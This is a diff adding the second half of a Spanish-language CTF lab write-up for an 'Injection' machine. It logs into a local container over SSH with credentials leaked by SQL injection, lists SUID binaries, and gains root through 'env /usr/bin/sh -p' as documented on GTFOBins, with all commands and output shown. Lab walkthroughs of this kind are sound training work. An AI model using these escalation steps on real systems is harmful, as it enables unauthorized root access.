@@ -121,3 +121,100 @@ Al hacer clic en "Login" y si ya inyección fue exitosa, nos redireccionará a l
 ![image](https://github.com/user-attachments/assets/2c22cc65-55db-49ef-93f0-fbe9f9fe10cd)
 
 En la pantalla se puede apreciar el nombre `Dylan` y la contraseña `KJSDFG789FGSDF78` y, como se pudo ver en el escaneo de puertos, el servicio SSH está habilitado, por ende, podrían ayudarnos a acceder a la máquina.
+
+---
+
+## Acceso con SSH
+Con el usuario y contraseña obtenidos desde la web, podemos intentar acceder.
+```Python
+~/Injection ᐅ ssh dylan@172.17.0.2
+```
+
+**Salida:**
+```Python
+The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
+ED25519 key fingerprint is SHA256:5ic4ZXizeEb8agR4jNX59cBONCe5b5iEcU9lf2zt0Q0.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
+dylan@172.17.0.2's password:
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.153.1-microsoft-standard-WSL2 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+dylan@0309b0a7801d:~$
+```
+**Comprobación:**
+```Python
+dylan@0309b0a7801d:~$ whoami
+dylan
+```
+
+## Escalada de privilegios
+#### Enumeración de privilegios
+En este caso, la máquina no cuenta con Sudo
+```Python
+dylan@0309b0a7801d:~$ sudo -l
+-bash: sudo: command not found
+```
+Por lo que, se tendrá que recurrir a la busqueda de binarios con permisos SUID. Se trata de un permiso especial que permite que el archivo se ejecute con los permisos del propietario del archivo, en lugar de con los permisos del usuario que lo ejecuta.
+```Python
+dylan@0309b0a7801d:~$ find /usr/bin -perm /4000
+```
+**Salida:**
+```Python
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/env
+/usr/bin/gpasswd
+/usr/bin/chsh
+```
+El binario que puede ayudar para escalar privilegios, es el binario `env`.
+
+#### Búsqueda de técnicas de escalada de privilegios con Searchbins
+```Python
+~/Injection ᐅ searchbins -b env -f suid
+```
+**Salida:**
+```Python
+
+[+] Binary: env
+
+================================================================================
+[*] Function: suid -> [https://gtfobins.github.io/gtfobins/env/#suid]
+
+        | ./env /bin/sh -p
+```
+#### Ejecución de la Escalada de Privilegios
+
+```python
+dylan@0309b0a7801d:~$ /usr/bin/env /usr/bin/sh -p
+```
+
+Este comando utiliza `env` con permiso SUID para ejecutar un shell con permisos de root.
+
+**Comprobación:**
+```python
+# whoami
+root
+```
+
+
